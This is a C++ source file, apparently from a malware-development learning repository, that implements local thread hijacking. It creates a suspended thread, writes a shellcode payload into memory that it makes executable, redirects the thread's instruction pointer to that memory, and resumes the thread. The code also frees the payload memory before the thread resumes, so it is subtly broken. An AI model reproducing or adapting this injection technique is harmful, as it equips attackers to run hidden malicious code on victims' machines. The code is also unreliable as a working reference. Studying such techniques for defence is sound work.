/**
 * Author : Yekuuun
 * Github : https://github.com/Yekuuun
 * 
 * Running a base thread hijacking.
 */
#include "hijack.hpp"

/**
 * @param hThread => handle to a suspended thread.
 * @param pPayload => ptr to payload.
 * @param sPayloadSize => SIZE_T sizeof payload.
 */
BOOL BaseHijack(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize){
    BOOL  STATE          = TRUE;
    DWORD oldProctection = NULL;
    PVOID pAddress       = NULL;

    CONTEXT ThreadCtx = {
        .ContextFlags = CONTEXT_CONTROL
    };

    //Allocate mem.
    pAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if(pAddress == NULL){
        printf("[!] Error allocating virtual memory. \n");
        return FALSE;
    }

    memcpy(pAddress, pPayload, sPayloadSize);

    //Changing protect
    if(!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &oldProctection)){
        printf("[!] Error protecting memory \n");
        STATE = FALSE; goto _EndFunc;
    }

    //Getting original thread context
    if(!GetThreadContext(hThread, &ThreadCtx)){
        printf("[!] GetThreadContext failed.");
        STATE = FALSE; goto _EndFunc;
    }

    //updating the new instruction pointer to be equal to the payload's address.
    ThreadCtx.Rip = (DWORD64)pAddress;

    //Updating the new context
    if(!SetThreadContext(hThread, &ThreadCtx)){
        printf("[!] SetThreadContext failed.");
        STATE = FALSE; goto _EndFunc;
    }

_EndFunc:
    if(pAddress){
        VirtualFree(pAddress, 0, MEM_RELEASE);
    }

    return STATE;
}

//from maldev.
VOID DummyFunction() {

	// stupid code
	int		j		= rand();
	int		i		= j * j;

}

//test.
int main(){
    DWORD  dwThreadId	= NULL;
    HANDLE hThread      = NULL;

    hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE) &DummyFunction, NULL, CREATE_SUSPENDED, &dwThreadId);
	if (hThread == NULL) {
		printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

    printf("Locale thread hijacking for TID %d \n", dwThreadId);

    if(!BaseHijack(hThread, CalcPayload, sizeof(CalcPayload))){
        return EXIT_FAILURE;
    };

    printf("DONE... \n");
    printf("[#] Press <Enter> To Run The Payload ... ");
	getchar();

    ResumeThread(hThread);

    WaitForSingleObject(hThread, INFINITE);

    printf("[#] Press <Enter> To Quit ... ");
    getchar();

    return EXIT_SUCCESS;
}